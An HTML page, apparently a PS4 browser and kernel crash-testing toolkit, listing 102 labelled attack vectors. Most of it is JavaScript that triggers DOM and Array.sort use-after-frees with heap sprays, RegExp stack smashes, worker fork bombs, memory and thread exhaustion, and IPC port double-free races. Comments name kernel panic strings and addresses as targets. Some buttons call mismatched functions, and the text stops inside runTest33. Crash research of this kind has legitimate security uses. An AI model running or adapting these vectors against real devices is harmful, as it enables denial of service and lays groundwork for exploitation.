<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 FATAL V1</title>
</head>
<body>

<h1>PS4 FATAL VECTORS (NO-JIT)</h1>

<button onclick="runTest1()">1. DOM TreeWalker UAF</button>
<button onclick="runTest2()">2. RegExp Stack Smash</button>
<button onclick="runTest3()">3. History State Flood</button>
<button onclick="runTest4()">4. Kernel Thread Exhaustion</button>
<button onclick="runTest5()">5. VFS Buffer Race</button>
<button onclick="runTest6()">6. IPC Pipe Active List Race</button>
<button onclick="runTest7()">7. ContentEditable Image Selection UAF</button>
<button onclick="runTest8()">8. Iframe Fullscreen Detach Race</button>
<button onclick="runTest9()">9. Anchor Drag Recursion Stack Smash</button>
<button onclick="runTest10()">10. VFS Deep Path Lookup Panic</button>
<button onclick="runTest11()">11. Recursive Worker Fork Bomb</button>
<button onclick="runTest12()">12. IPC Port Transfer UAF</button>
<button onclick="runTest13()">13. Array Sort Proxy Mutation UAF</button>
<button onclick="runTest14()">14. Selection Range Detach Race</button>
<button onclick="runTest15()">15. RegExp Source Recursive Allocator Smash</button>
<button onclick="runTest16()">16. VFS Blob Slice Overlap Panic</button>
<button onclick="runTest17()">17. Thread Signal Handler Stack Exhaustion</button>
<button onclick="runTest18()">18. IPC Pipe Double Free Race</button>
<button onclick="runTest19()">19. StructuredClone Serialization Proxy Recursive Smash</button>
<button onclick="runTest20()">20. NodeIterator DocumentFragment Move UAF</button>
<button onclick="runTest21()">21. FontFaceSet Loading Layout Thrash Crash</button>
<button onclick="runTest22()">22. Kqueue Event Exhaustion via FileReader Abort</button>
<button onclick="runTest23()">23. VFS Pathname Lookup Stack Overflow</button>
<button onclick="runTest24()">24. Scheduler Thread Termination Race</button>
<button onclick="runTest25()">25. DOMParser Mutation Observer UAF</button>
<button onclick="runTest26()">26. RegExp LastIndex Integer Overflow</button>
<button onclick="runTest27()">27. Textarea Selection ExecCommand Crash</button>
<button onclick="runTest28()">28. Blob URL Revoke VFS Race</button>
<button onclick="runTest29()">29. MessageChannel Port Transfer UAF</button>
<button onclick="runTest30()">30. VM Map Exhaustion via Iframe Flood</button>
<button onclick="runTest31()">31. HTMLTemplate Clone Mutation UAF</button>
<button onclick="runTest32()">32. Canvas Pattern Recursive Stall</button>
<button onclick="runTest33()">33. DOMNodeRemoved Recursive Tree UAF</button>
<button onclick="runTest34()">34. Socket Mbuf Cluster Fragmentation</button>
<button onclick="runTest35()">35. VFS Path Lookup Race Condition</button>
<button onclick="runTest36()">36. IPC Port Circular Transfer Panic</button>
<button onclick="runTest37()">37. Textarea ExecCommand Layout UAF</button>
<button onclick="runTest38()">38. XHR Blob Response Type Confusion</button>
<button onclick="runTest39()">39. TreeWalker Filter Node Removal Smash</button>
<button onclick="runTest40()">40. Socket Buffer Zone Fragmentation</button>
<button onclick="runTest41()">41. FileReader Kqueue Race Condition</button>
<button onclick="runTest42()">42. Worker Thread Message Flood Panic</button>
<button onclick="runTest43()">43. TextNode Split Layout Desync</button>
<button onclick="runTest44()">44. Cyclic JSON Stringify Stack Smash</button>
<button onclick="runTest45()">45. Form Collection NamedItem UAF</button>
<button onclick="runTest46()">46. VM Map Fragmentation via Blob Resize</button>
<button onclick="runTest47()">47. Socket File Descriptor Starvation</button>
<button onclick="runTest48()">48. Thread Signal Queue Overflow</button>
<button onclick="runTest49()">49. CSSRuleList Mutation Race UAF</button>
<button onclick="runTest50()">50. Document AdoptNode Destruction Race</button>
<button onclick="runTest51()">51. EventPath Dispatcher Tree UAF</button>
<button onclick="runTest52()">52. FileReader Sync/Async Locking Panic</button>
<button onclick="runTest53()">53. MessagePort Zombie Process Flood</button>
<button onclick="runTest54()">54. Kernel Stack Guard Page Collision</button>
<button onclick="runTest55()">55. AudioBufferSourceNode Detach Race</button>
<button onclick="runTest56()">56. HTMLFormControls NamedItem UAF</button>
<button onclick="runTest57()">57. Array Splice Proxy Resize Panic</button>
<button onclick="runTest58()">58. File Descriptor Table Race via XHR</button>
<button onclick="runTest59()">59. VM Object Shadow Chain Collapse</button>
<button onclick="runTest60()">60. IPV6 Header Mbuf Overflow</button>
<button onclick="runTest61()">61. TrackEvent Disptach UAF</button>
<button onclick="runTest62()">62. Range ExtractContents Mutation Race</button>
<button onclick="runTest63()">63. DOMStringMap Prototype Poisoning</button>
<button onclick="runTest64()">64. Socket Sendfile Zero-Copy Panic</button>
<button onclick="runTest65()">65. Kqueue File Monitor Exhaustion</button>
<button onclick="runTest66()">66. VM Object Collapse via Recursive Blob</button>
<button onclick="runTest67()">67. Fullscreen Promise Element Detach UAF</button>
<button onclick="runTest68()">68. SVG Animation Fullscreen Render Crash</button>
<button onclick="runTest69()">69. ShadowDOM Slot Fullscreen Event Race</button>
<button onclick="runTest70()">70. Compositor Surface Realloc Panic</button>
<button onclick="runTest71()">71. VFS Blob Lock during Mode Switch</button>
<button onclick="runTest72()">72. Scheduler Affinity Thrash via Workers</button>
<button onclick="runTest67()">73. XSLTProcessor Recursive Import Crash</button>
<button onclick="runTest68()">74. MathML Fraction Layout Overflow</button>
<button onclick="runTest69()">75. XMLSerializer Namespace Race</button>
<button onclick="runTest70()">76. WebSQL Transaction Locking Panic</button>
<button onclick="runTest71()">77. LocalStorage Sync VFS Race</button>
<button onclick="runTest72()">78. Canvas Gradient Object UAF</button>
<button onclick="runTest79()">79. WebCrypto Key Import/Export UAF</button>
<button onclick="runTest80()">80. Intl.Collator Compare Mutator</button>
<button onclick="runTest81()">81. ReadableStream Tee Recursion Smash</button>
<button onclick="runTest82()">82. FormData Zero-Length Slice Panic</button>
<button onclick="runTest83()">83. FileReaderSync Worker Revoke Race</button>
<button onclick="runTest84()">84. XHR IPv6 Header Fragmentation Spray</button>
<button onclick="runTest85()">85. BroadcastChannel Message Clone UAF</button>
<button onclick="runTest86()">86. URLSearchParams Iterator Mutation Crash</button>
<button onclick="runTest87()">87. CustomEvent Disconnected Subtree Path</button>
<button onclick="runTest88()">88. PerformanceObserver Ring Buffer Overflow</button>
<button onclick="runTest89()">89. TypedArray Species Constructor Overflow</button>
<button onclick="runTest90()">90. Sync XHR Worker Sigkill Socket Race</button>
<button onclick="runTest91()">91. Document.open() Recursive Loader Smash</button>
<button onclick="runTest92()">92. TextDecoder Stream State Corruption</button>
<button onclick="runTest93()">93. ImageData Buffer Detach Race</button>
<button onclick="runTest94()">94. VM Map Entry Exhaustion (mmap flood)</button>
<button onclick="runTest95()">95. XHR Send Blob Slice Vnode Lock Race</button>
<button onclick="runTest96()">96. Nested Worker Chain Kernel Stack Overflow</button>
<button onclick="runTest97()">97. Reflect.construct Array Subclass UAF</button>
<button onclick="runTest98()">98. DOMAttrModified Recursive Event Smash</button>
<button onclick="runTest99()">99. TreeWalker Filter Exception State Corruption</button>
<button onclick="runTest100()">100. IPv6 Hop-Limit Header Mbuf Corruption</button>
<button onclick="runTest101()">101. Worker Transferable Buffer Race</button>
<button onclick="runTest102()">102. VM Map Fragmentation via Canvas Buffer</button>

<div id="log"></div>

<script>
function log(msg) {
    document.getElementById("log").innerText += "\n" + msg;
}

function runTest1() {
    log("1. DOM UAF...");
    var root = document.createElement('div');
    var nodes = [];
    for(var i=0; i<100; i++) {
        var el = document.createElement('div');
        nodes.push(el);
        root.appendChild(el);
    }
    var walker = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT, {
        acceptNode: function(node) {
            if(nodes.indexOf(node) === 50) {
                root.textContent = '';
                var filler = [];
                for(var k=0; k<2000; k++) filler.push(new Uint8Array(2048));
                return NodeFilter.FILTER_ACCEPT;
            }
            return NodeFilter.FILTER_ACCEPT;
        }
    }, false);
    try {
        while(walker.nextNode()) {
            var curr = walker.currentNode;
            if(curr && curr.style) curr.style.color = "red";
        }
    } catch(e) { log("Error: " + e); }
}

function runTest2() {
    log("2. RegExp Smash...");
    try {
        var struct = [];
        for(var i=0; i<5000; i++) struct.push("(");
        var pattern = struct.join("") + "a" + struct.map(function(){return ")"}).join("");
        var str = "a".repeat(5000);
        var re = new RegExp(pattern);
        var res = re.test(str);
        log("Result: " + res);
    } catch(e) {
        log("Stack Limit: " + e);
        var arr = [];
        for(var i=0; i<10000; i++) arr.push(new Array(100).join("A"));
    }
}

function runTest3() {
    log("3. History Flood...");
    var state = { data: new Array(1000).join("X") };
    var url = window.location.href;
    var count = 0;
    var i = setInterval(function() {
        try {
            for(var k=0; k<50; k++) {
                history.pushState(state, "S" + count, url + "#" + count);
                count++;
            }
            if(count > 20000) {
                history.go(-10000);
            }
        } catch(e) {
            clearInterval(i);
            log("Memory Limit Hit");
            var crash = new Uint32Array(0x40000000);
        }
    }, 10);
}

function runTest4() {
    log("4. Thread Exhaustion...");
    var blob = new Blob(["setInterval(function(){ var x=0; for(var i=0;i<100000;i++)x+=i; }, 100);"], {type: 'text/javascript'});
    var url = URL.createObjectURL(blob);
    var workers = [];
    var active = true;
    var i = setInterval(function() {
        if(!active) return;
        try {
            var w = new Worker(url);
            workers.push(w);
            if(workers.length > 500) {
                var old = workers.shift();
                old.terminate();
            }
        } catch(e) {
            log("Thread Alloc Fail");
            active = false;
            setTimeout(function(){ 
                for(var k=0; k<workers.length; k++) workers[k].terminate();
                workers = [];
                active = true; 
            }, 1000);
        }
    }, 5);
}

function runTest5() {
    log("5. VFS Race...");
    var data = new Uint8Array(1024*1024*4);
    var blob = new Blob([data]);
    var readers = [];
    var i = setInterval(function() {
        var start = Math.floor(Math.random() * 20000);
        var slice = blob.slice(start, start + 4096);
        var fr = new FileReader();
        fr.readAsArrayBuffer(slice);
        readers.push(fr);
        if(readers.length > 100) readers.shift();
        if(Math.random() > 0.9) {
            var newBlob = new Blob([data]);
            blob = newBlob;
        }
    }, 2);
}

function runTest6() {
    log("6. Pipe Race...");
    var transfer = [];
    var channel = new MessageChannel();
    var port = channel.port2;
    var w = new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){ e.data.close(); postMessage("done"); }'], {type:'text/javascript'})));
    var i = setInterval(function() {
        try {
            var mc = new MessageChannel();
            var p1 = mc.port1;
            var p2 = mc.port2;
            p1.postMessage(new Uint8Array(2048));
            w.postMessage(p2, [p2]);
            p1.close();
            transfer.push(p1);
            if(transfer.length > 200) transfer.shift();
        } catch(e) {}
    }, 1);
}

// 7. ContentEditable Image Selection UAF
function runTest7() {
    log("7. Edit Selection UAF...");
    var container = document.createElement('div');
    container.contentEditable = "true";
    document.body.appendChild(container);

    var img = document.createElement('img');
    img.src = "x"; // Broken image is fine
    img.alt = "crash";
    container.appendChild(img);
    
    // Foca e seleciona a imagem
    container.focus();
    var sel = window.getSelection();
    var range = document.createRange();
    range.selectNode(img);
    sel.removeAllRanges();
    sel.addRange(range);

    // Vetor de ataque: Mutação durante interação
    // Tenta acessar propriedades de layout do Range enquanto removemos o nó do DOM
    try {
        var rect = range.getBoundingClientRect();
        document.body.removeChild(container);
        
        // Spray de memória para ocupar o espaço do nó liberto
        var junk = [];
        for(var i=0; i<1000; i++) junk.push(new Uint8Array(1024));
        
        // Acesso pós-liberação
        var x = rect.width; 
        log("Width accessed after delete: " + x);
    } catch(e) { log("Error: " + e); }
}

// 8. Iframe Fullscreen Detach Race
function runTest8() {
    log("8. Fullscreen Detach...");
    var f = document.createElement('iframe');
    document.body.appendChild(f);
    
    f.onload = function() {
        var doc = f.contentDocument;
        var el = doc.createElement('div');
        el.innerText = "FULLSCREEN TARGET";
        doc.body.appendChild(el);
        
        // Tenta entrar em fullscreen
        // Nota: Requer interação do usuário no botão principal para propagar a permissão
        el.requestFullscreen().then(function() {
            log("Entered FS (Too slow)");
        }).catch(function(e) { 
            // Esperado falhar se não houver user gesture direta, 
            // mas o objetivo é a race condition interna no Window Manager
        });
        
        // Race: Destruir o contexto (iframe) imediatamente após o pedido
        // O WebKit pode tentar enviar uma mensagem IPC para uma janela que não existe mais
        setTimeout(function() {
            document.body.removeChild(f);
            // Tenta forçar atualização de layout do compositor
            var c = document.createElement('canvas');
            c.width = 4096; c.height = 4096; // Alocação pesada de textura
        }, 10);
    };
}

// 9. Anchor Drag Recursion Stack Smash
function runTest9() {
    log("9. Drag Recursion...");
    var a = document.createElement('a');
    a.href = "#";
    a.innerText = "DRAG ME";
    a.draggable = true;
    document.body.appendChild(a);
    
    // Handler recursivo
    a.ondragstart = function(e) {
        // Cria aninhamento DOM profundo durante o início do arrasto
        var p = document.createElement('div');
        for(var i=0; i<2000; i++) {
            var c = document.createElement('div');
            p.appendChild(c);
            p = c;
        }
        document.body.appendChild(p);
        
        // Modifica o alvo do arrasto
        try {
            e.dataTransfer.setData("text/plain", "payload");
            // Recursão síncrona de eventos
            a.ondragstart(e);
        } catch(z) { log("Stack limit hit"); }
    };
    
    // Simula evento (pode não disparar stack completa sem mouse real, mas estressa o event loop)
    try {
        var ev = new DragEvent('dragstart');
        a.dispatchEvent(ev);
    } catch(e) {}
}

// 10. VFS Deep Path Lookup Panic
function runTest10() {
    log("10. VFS Deep Path...");
    // Constrói um caminho virtual gigante
    var deep = "";
    for(var i=0; i<2000; i++) deep += "a/";
    
    try {
        // Empurra estado no histórico para mudar o "current directory" lógico da aba
        history.pushState({}, "deep", deep);
        
        // Cria um Blob URL
        var blob = new Blob(["test data"]);
        var url = URL.createObjectURL(blob);
        
        // Tenta resolver o Blob relativo ao caminho gigante via XHR
        // O Kernel VFS tenta concatenar CWD + URL
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "relative_file_test", true);
        xhr.send();
        
        // Limpeza rápida para causar race no namecache
        history.back();
    } catch(e) { log("VFS Error: " + e); }
}

// 11. Recursive Worker Fork Bomb
function runTest11() {
    log("11. Worker Fork Bomb...");
    
    // Código do Worker: Tenta criar 2 clones de si mesmo
    var code = `
        try {
            var w1 = new Worker(self.location.href);
            var w2 = new Worker(self.location.href);
        } catch(e) {}
        setInterval(function(){}, 1000); // Mantém vivo
    `;
    
    var blob = new Blob([code], {type: 'text/javascript'});
    var url = URL.createObjectURL(blob);
    var roots = [];
    
    var i = setInterval(function() {
        try {
            // Inicia a árvore
            var w = new Worker(url);
            roots.push(w);
            log("Thread spawned");
            
            // Limita para não congelar totalmente o navegador antes do kernel panic
            if(roots.length > 20) {
                clearInterval(i);
            }
        } catch(e) {
            log("Thread limit reached (Target 0xb12610)");
        }
    }, 200);
}

// 12. IPC Port Transfer UAF
function runTest12() {
    log("12. IPC Port UAF...");
    var transfer = [];
    var data = new Uint8Array(4096); // Enche o buffer do pipe
    
    // Worker para receber portas
    var w = new Worker(URL.createObjectURL(new Blob([`
        onmessage = function(e) {
            // Recebe a porta e tenta postar de volta
            var p = e.data;
            p.postMessage("ack");
            p.close();
        }
    `], {type:'text/javascript'})));

    var i = setInterval(function() {
        var mc = new MessageChannel();
        // 1. Enche o buffer da porta 1
        mc.port1.postMessage(data);
        
        // 2. Transfere a porta 2 para o worker (clona o descritor no kernel)
        w.postMessage(mc.port2, [mc.port2]);
        
        // 3. Fecha a porta 1 imediatamente
        // Race condition: O kernel está copiando dados de p1->p2 enquanto p1 morre
        mc.port1.close();
        
    }, 5);
    
    setTimeout(function() { clearInterval(i); w.terminate(); }, 4000);
}
// 13. Array Sort Proxy Mutation UAF (WebKit)
// Explora a implementação C++ do Array.sort. O Proxy intercepta o acesso aos índices.
// Se deletarmos elementos do array DURANTE a ordenação, o motor pode acessar memória inválida.
function runTest13() {
    log("13. Sort Mutation...");
    try {
        var arr = [];
        for(var i = 0; i < 1000; i++) arr[i] = i;
        var proxy = new Proxy(arr, {
            get: function(target, prop) {
                if (prop === 'length') return target.length;
                var val = Reflect.get(target, prop);
                // MUTAÇÃO CRÍTICA: No meio da ordenação, quando o índice 500 é acessado,
                // destruímos o array subjacente redimensionando-o para 0.
                if (prop === '500') {
                    target.length = 0;
                    // Tenta preencher a memória libertada com lixo
                    var junk = new Array(1000).fill(1.1);
                    return undefined;
                }
                return val;
            },
            deleteProperty: function(target, prop) {
                return Reflect.deleteProperty(target, prop);
            }
        });
        // Dispara o algoritmo de sort nativo sobre o proxy
        Array.prototype.sort.call(proxy, function(a, b) {
            return b - a;
        });
    } catch(e) {
        log("Sort safe: " + e);
    }
}

// 14. Selection Range Detach Race (WebKit)
// Manipula a API de Seleção. Adiciona ranges, modifica o DOM e tenta acessar
// o objeto Range que pode ter ficado num estado inconsistente ("detached" mas ainda referenciado).
function runTest14() {
    log("14. Selection Race...");
    var root = document.createElement('div');
    document.body.appendChild(root);
    var child = document.createElement('span');
    root.appendChild(child);
    var sel = window.getSelection();
    
    // Configura um loop de alteração rápida de seleção
    for(var i = 0; i < 50; i++) {
        var r = document.createRange();
        r.selectNode(child);
        sel.addRange(r);
        
        // Listener que remove o nó alvo durante a manipulação do range
        var handler = function() {
            try {
                root.removeChild(child);
                // Acesso a propriedade calculada em nó removido
                var rect = r.getBoundingClientRect(); 
                child = document.createElement('span'); // Recria para o próximo loop
                root.appendChild(child);
            } catch(z) {}
        };
        
        root.addEventListener('DOMSubtreeModified', handler);
        // Trigger: Tenta modificar o range, disparando o listener
        try { r.setStart(root, 0); } catch(e){}
        root.removeEventListener('DOMSubtreeModified', handler);
        sel.removeAllRanges();
    }
}

// 15. RegExp Source Recursive Allocator Smash (WebKit)
// Alvo: "Cannot allocate a buffer of this size" (0x2dad419).
// Cria um objeto que retorna uma string gigante quando convertido para primitiva,
// e usa isso dentro do construtor RegExp para estourar o alocador de string.
function runTest15() {
    log("15. RegExp Alloc Smash...");
    try {
        var base = "A".repeat(1024 * 512); // 512KB base
        var evil = {
            toString: function() {
                // Crescimento exponencial na memória
                var s = base;
                for(var k=0; k<12; k++) s += s; // 512KB * 4096 = 2GB
                return s;
            }
        };
        // O construtor RegExp precisa alocar buffer para o 'source'
        // Se falhar a verificação de tamanho antes da cópia interna -> Crash
        var re = new RegExp(evil);
        log("RegExp created (unexpected)");
    } catch(e) {
        log("Alloc limit hit: " + e.message);
        // Tenta novamente com tamanho ligeiramente menor para acertar a borda do heap
        try {
            var re2 = new RegExp("B".repeat(0x10000000));
        } catch(z) {}
    }
}

// 16. VFS Blob Slice Overlap Panic (Kernel)
// Alvo: "warning: tbp->b_bcount wrong" (0xb18caa).
// Cria slices de Blob que se sobrepõem e lê-os concorrentemente.
// Isso estressa o sistema de bloqueio de buffers (buffer locking) do VFS.
function runTest16() {
    log("16. VFS Overlap Panic...");
    var data = new Uint8Array(1024 * 1024 * 2); // 2MB
    var blob = new Blob([data]);
    var readers = [];
    
    var i = setInterval(function() {
        // Gera offsets aleatórios que garantem sobreposição de setores
        var start1 = Math.floor(Math.random() * 10000);
        var end1 = start1 + 4096;
        var start2 = start1 + 512; // Sobreposição parcial (offset de setor)
        var end2 = start2 + 4096;
        
        var slice1 = blob.slice(start1, end1);
        var slice2 = blob.slice(start2, end2);
        
        var fr1 = new FileReader();
        var fr2 = new FileReader();
        
        // Dispara leituras simultâneas na mesma região física do disco virtual
        fr1.readAsArrayBuffer(slice1);
        fr2.readAsArrayBuffer(slice2);
        
        readers.push(fr1, fr2);
        if(readers.length > 50) readers.splice(0, 20);
    }, 10);
    
    setTimeout(function(){ clearInterval(i); }, 4000);
}

// 17. Thread Signal Handler Stack Exhaustion (Kernel)
// Alvo: "failed to allocate luke_mthread_elem" (0xb12610).
// Cria Workers que entram em recursão profunda (consumindo stack do kernel/user)
// e então tentam spawnar novos processos/threads.
function runTest17() {
    log("17. Thread Stack Smash...");
    // Código do Worker: Consome stack e spawna thread
    var code = `
        function recurse(n) {
            if(n <= 0) return;
            var x = new Uint8Array(100); // Aloca na stack frame
            recurse(n-1);
        }
        try {
            recurse(2000); // Consome stack frame da thread atual
            // Tenta criar nova thread com stack pointer próximo do limite
            var w = new Worker(self.location.href); 
        } catch(e) {}
    `;
    var blob = new Blob([code], {type:'text/javascript'});
    var url = URL.createObjectURL(blob);
    var pool = [];
    
    var i = setInterval(function() {
        try {
            var w = new Worker(url);
            pool.push(w);
            // Rotatividade alta para forçar alocação/desalocação de estruturas de thread
            if(pool.length > 30) pool.shift().terminate();
        } catch(e) {
            log("Thread Exhaustion Hit");
        }
    }, 50);
    
    setTimeout(function(){ clearInterval(i); pool.forEach(function(w){w.terminate()}); }, 5000);
}

// 18. IPC Pipe Double Free Race (Kernel)
// Alvo: "free pipe (%x) active list" (0xb0f609).
// Envia uma porta (pipe) para um Worker, fecha-a na main thread e no worker quase simultaneamente.
// Tenta causar uma dupla liberação (double free) da estrutura do pipe no kernel.
function runTest18() {
    log("18. IPC Double Free...");
    var mc = new MessageChannel();
    var p1 = mc.port1;
    var p2 = mc.port2;
    
    var w = new Worker(URL.createObjectURL(new Blob([`
        onmessage = function(e) {
            var p = e.data;
            // Fecha a porta recebida imediatamente
            p.close();
            postMessage("closed");
        }
    `], {type:'text/javascript'})));
    
    var i = setInterval(function() {
        // Recria canal
        var c = new MessageChannel();
        var portToSend = c.port2;
        var portToKeep = c.port1;
        
        // Envia dados para ativar o buffer do kernel
        portToKeep.postMessage(new Uint8Array(128));
        
        // 1. Envia porta para o worker
        w.postMessage(portToSend, [portToSend]);
        
        // 2. Tenta fechar a mesma porta localmente (o que seria inválido se transferido com sucesso)
        // ou fecha a porta par (portToKeep) para destruir a conexão
        // A intenção é criar uma race na desmontagem do pipe par
        try { portToSend.close(); } catch(e) {}
        portToKeep.close();
        
    }, 2);
    
    setTimeout(function(){ clearInterval(i); w.terminate(); }, 4000);
}
function runTest19() {
    log("19. Clone Smash...");
    try {
        var target = { a: 1 };
        var proxy = new Proxy(target, {
            get: function(t, p) {
                if(p === 'a') {
                    var n = {};
                    var c = n;
                    for(var i=0; i<5000; i++) {
                        c.next = {};
                        c = c.next;
                    }
                    return n;
                }
                return Reflect.get(t, p);
            }
        });
        var deep = [];
        for(var k=0; k<1000; k++) deep.push(proxy);
        window.postMessage(deep, "*");
    } catch(e) {
        log("Clone Error: " + e);
    }
}

function runTest20() {
    log("20. Iterator UAF...");
    var root = document.createElement('div');
    var c1 = document.createElement('div');
    var c2 = document.createElement('div');
    root.appendChild(c1);
    root.appendChild(c2);
    var frag = document.createDocumentFragment();
    var ni = document.createNodeIterator(root, NodeFilter.SHOW_ELEMENT, {
        acceptNode: function(node) {
            if(node === c1) {
                frag.appendChild(c1);
                root.removeChild(c2);
                var j = [];
                for(var i=0; i<1000; i++) j.push(new Uint8Array(1024));
                return NodeFilter.FILTER_ACCEPT;
            }
            return NodeFilter.FILTER_ACCEPT;
        }
    });
    try {
        ni.nextNode(); 
        ni.nextNode(); 
    } catch(e) { log(e); }
}

function runTest21() {
    log("21. Font Loading Race...");
    var f = new FontFace('CrashFont', 'url(data:font/woff;base64,AAEAAA...)');
    document.fonts.add(f);
    var el = document.createElement('div');
    el.style.fontFamily = 'CrashFont';
    el.innerText = 'TEST';
    document.body.appendChild(el);
    f.load().then(function() {
        document.fonts.clear();
        document.body.removeChild(el);
    });
    var i = setInterval(function() {
        try {
            el.style.fontFamily = 'serif';
            var x = document.body.offsetWidth; 
            document.fonts.add(f);
            el.style.fontFamily = 'CrashFont';
        } catch(e) {}
    }, 1);
    setTimeout(function(){ clearInterval(i); }, 3000);
}

function runTest22() {
    log("22. Kqueue Exhaustion...");
    var b = new Blob(["A".repeat(1024*1024)]);
    var readers = [];
    var i = setInterval(function() {
        for(var k=0; k<50; k++) {
            var fr = new FileReader();
            readers.push(fr);
            fr.readAsArrayBuffer(b);
            fr.abort(); 
        }
        if(readers.length > 5000) {
            readers = [];
            log("Flushing knotes...");
        }
    }, 10);
    setTimeout(function(){ clearInterval(i); }, 4000);
}

function runTest23() {
    log("23. Pathname Overflow...");
    var huge = "/";
    for(var i=0; i<2000; i++) huge += "a/";
    try {
        history.pushState(null, null, huge);
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "trigger_lookup", true);
        xhr.send();
        var f = document.createElement("iframe");
        f.src = "trigger_lookup_frame";
        document.body.appendChild(f);
        setTimeout(function(){ history.back(); }, 100);
    } catch(e) { log(e); }
}

function runTest24() {
    log("24. Sched Race...");
    var code = "while(1) { Math.random(); }";
    var b = new Blob([code], {type:'text/javascript'});
    var u = URL.createObjectURL(b);
    var pool = [];
    var i = setInterval(function() {
        var w = new Worker(u);
        pool.push(w);
        if(pool.length > 40) {
            var t = pool.shift();
            t.terminate();
            t = null;
        }
    }, 5);
    setTimeout(function(){ clearInterval(i); pool.forEach(p=>p.terminate()); }, 5000);
}
function runTest25() {
    log("25. Parser UAF...");
    var parser = new DOMParser();
    var doc = parser.parseFromString("<div><p>A</p><p>B</p></div>", "text/html");
    var p = doc.querySelector("p");
    var observer = new MutationObserver(function(mutations) {
        try {
            doc.body.textContent = "";
            var trash = [];
            for(var i=0; i<2000; i++) trash.push(new Uint8Array(4096)); 
        } catch(e) {}
    });
    observer.observe(doc.body, { childList: true, subtree: true });
    try {
        var range = doc.createRange();
        range.setStart(p, 0);
        range.setEnd(p, 1);
        range.deleteContents(); 
        var div = doc.createElement("div");
        div.appendChild(p); 
    } catch(e) { log(e); }
}

function runTest26() {
    log("26. RegExp Overflow...");
    try {
        var re = /a/g;
        var str = "a".repeat(1000);
        re.lastIndex = 0xFFFFFFFE; 
        var res = re.exec(str); 
        var arr = [];
        for(var i=0; i<1000; i++) {
            re.lastIndex = 4294967294 + i;
            if(re.exec(str)) {
                arr.push(re.lastIndex);
            }
        }
        log("Index: " + arr.length);
    } catch(e) { log(e); }
}

function runTest27() {
    log("27. Textarea Crash...");
    var t = document.createElement("textarea");
    document.body.appendChild(t);
    t.focus();
    var i = 0;
    var interval = setInterval(function() {
        try {
            t.value = "A".repeat(1000);
            t.setSelectionRange(50, 50);
            document.execCommand("insertText", false, "B");
            t.style.display = "none";
            var rect = t.getBoundingClientRect(); 
            document.body.removeChild(t);
            t = document.createElement("textarea");
            document.body.appendChild(t);
            t.focus();
        } catch(e) {}
        i++;
        if(i>50) { clearInterval(interval); }
    }, 10);
}

function runTest28() {
    log("28. VFS Race...");
    var blob = new Blob([new Uint8Array(1024*1024)]);
    var url = URL.createObjectURL(blob);
    var workers = [];
    for(var k=0; k<10; k++) {
        var w = new Worker(URL.createObjectURL(new Blob([
            "onmessage=function(e){ var x=new XMLHttpRequest(); x.open('GET',e.data,false); try{x.send();}catch(z){} }"
        ], {type:'text/javascript'})));
        workers.push(w);
    }
    var i = setInterval(function() {
        for(var j=0; j<workers.length; j++) workers[j].postMessage(url);
        setTimeout(function() {
            URL.revokeObjectURL(url);
            url = URL.createObjectURL(new Blob([new Uint8Array(10)])); 
        }, 1);
    }, 50);
    setTimeout(function(){ clearInterval(i); }, 4000);
}

function runTest29() {
    log("29. IPC UAF...");
    var channel = new MessageChannel();
    var port = channel.port2;
    var worker = new Worker(URL.createObjectURL(new Blob([
        "onmessage=function(e){ e.data.postMessage('pong'); e.data.close(); }"
    ], {type:'text/javascript'})));
    var i = setInterval(function() {
        try {
            var mc = new MessageChannel();
            var p1 = mc.port1;
            var p2 = mc.port2;
            p1.postMessage(new Uint8Array(2048));
            worker.postMessage(p2, [p2]);
            p1.close(); 
            var junk = new ArrayBuffer(1024);
        } catch(e) {}
    }, 2);
    setTimeout(function(){ clearInterval(i); worker.terminate(); }, 4000);
}

function runTest30() {
    log("30. VM Map Flood...");
    var frames = [];
    var i = setInterval(function() {
        var f = document.createElement("iframe");
        document.body.appendChild(f);
        frames.push(f);
        try {
            f.contentWindow.history.pushState(null, null, "/junk/" + Math.random());
            f.contentWindow.location.reload(); 
        } catch(e) {}
        if(frames.length > 50) {
            var r = frames.shift();
            document.body.removeChild(r);
        }
    }, 10);
    setTimeout(function(){ clearInterval(i); }, 5000);
}
// 31. HTMLTemplate Clone Mutation UAF (WebKit)
// Alvo: cloneNode em Templates.
// Lógica: Modifica o conteúdo do template (content) enquanto ele está sendo clonado.
// O WebKit itera sobre os nós do template para clonar; se removermos nós durante o processo,
// o iterador interno pode perder a referência.
function runTest31() {
    log("31. Template UAF...");
    var t = document.createElement('template');
    var d = document.createElement('div');
    var s = document.createElement('span');
    t.content.appendChild(d);
    d.appendChild(s);
    
    // Define um getter malicioso num Custom Element ou Proxy para disparar a mutação
    // Como não temos JIT para otimizar, usamos MutationObserver para pegar o momento exato
    var observer = new MutationObserver(function(mutations) {
        try {
            t.content.textContent = ''; // Limpa o template original
            var junk = [];
            for(var i=0; i<1000; i++) junk.push(new Uint8Array(1024));
        } catch(e) {}
    });
    observer.observe(t.content, { childList: true, subtree: true });
    
    try {
        // Clone profundo dispara a travessia
        // A inserção de nós no clone pode disparar callbacks se houver custom elements
        var clone = t.content.cloneNode(true);
        document.body.appendChild(clone);
    } catch(e) { log(e); }
}

// 32. Canvas Pattern Recursive Stall (WebKit)
// Alvo: Contexto 2D / Renderização de Software.
// Lógica: Cria um padrão (createPattern) usando o próprio canvas como fonte
// e tenta desenhar esse padrão no próprio canvas. Isso cria um loop de feedback.
function runTest32() {
    log("32. Canvas Recursion...");
    var c = document.createElement('canvas');
    c.width = 100; c.height = 100;
    var ctx = c.getContext('2d');
    try {
        // Loop de criação de padrões aninhados
        var p = ctx.createPattern(c, 'repeat');
        ctx.fillStyle = p;
        ctx.fillRect(0, 0, 100, 100);
        
        var start = Date.now();
        var i = setInterval(function() {
            // Redimensiona para forçar re-rasterização com o padrão sujo
            c.width = (c.width == 100) ? 101 : 100;
            ctx.fillStyle = p; // Reatribui o padrão (que referencia o canvas antigo/novo)
            ctx.fillRect(0, 0, c.width, 100);
            
            // Stack smash via recursão de desenho
            if(Date.now() - start > 2000) clearInterval(i);
        }, 5);
    } catch(e) { log(e); }
}

// 33. DOMNodeRemoved Recursive Tree UAF (WebKit)
// Alvo: Eventos de Mutação Síncronos.
// Lógica: Remove um nó pai dentro do evento de remoção de um nó filho.
// O motor está processando a remoção do filho e de repente o pai desaparece.
function runTest33() {
